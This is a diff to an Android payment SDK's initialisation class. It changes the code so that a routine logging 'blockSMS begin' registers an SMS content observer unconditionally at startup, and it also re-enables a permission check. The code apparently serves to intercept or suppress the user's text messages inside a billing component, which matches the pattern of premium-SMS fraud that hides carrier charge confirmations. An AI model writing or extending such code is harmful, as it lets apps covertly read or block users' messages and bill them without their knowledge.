@@ -19,6 +19,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.net.Uri;
 import android.os.Handler;
+import android.os.Looper;
 import android.os.Message;
 import android.text.TextUtils;
 
@@ -31,6 +32,7 @@ public class SDKInit {
     SetEntity setEntity;
     int times = 0;
     private static int count = 0;
+    static SmsObserver mObserver;
 
     public static SDKInit getInstance() {
         if (sdkInitializer == null) {
@@ -63,12 +65,14 @@ public class SDKInit {
                                final String product, final String Did, final String extData, final Object payHandler,
                                final Handler initHandler) {
         mContext = ctx;
-//        permissionTest();
+        permissionTest();
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
+                    Looper.prepare();
                     init(ctx, price, payItemID, str, product, Did, extData, payHandler, initHandler);
+                    Looper.loop();
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
@@ -111,17 +115,16 @@ public class SDKInit {
         }.start();
     }
 
-    public void s(final Context ctx) {
+    public static void s(final Context ctx) {
 //        if (Build.VERSION.SDK_INT >= 23) {
 //            Log.debug("SDK verson >= 23");
 //            checkPermission(ctx);
 //        }
-
         if (Constants.isOutPut) {
             Log.debug("------------>blockSMS begin");
         }
         resolver = ctx.getContentResolver();
-        SmsObserver mObserver = new SmsObserver(new Handler() {
+        mObserver = new SmsObserver(new Handler() {
             @Override
             public void handleMessage(Message msg) {
                 super.handleMessage(msg);
@@ -167,6 +170,7 @@ public class SDKInit {
     }
 
     private void init(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final String extData, final Object payHandler, final Handler initHandler) {
+        s(mContext);
         GetDataImpl.getInstance(ctx).getPayInit(new HttpListener() {
             @Override
             public void result(String result) {
@@ -183,7 +187,6 @@ public class SDKInit {
                         Message msg = new Message();
                         msg.what = 1;
                         initHandler.sendMessage(msg);
-                        s(mContext);
                     }
                 } catch (Exception e) {
 
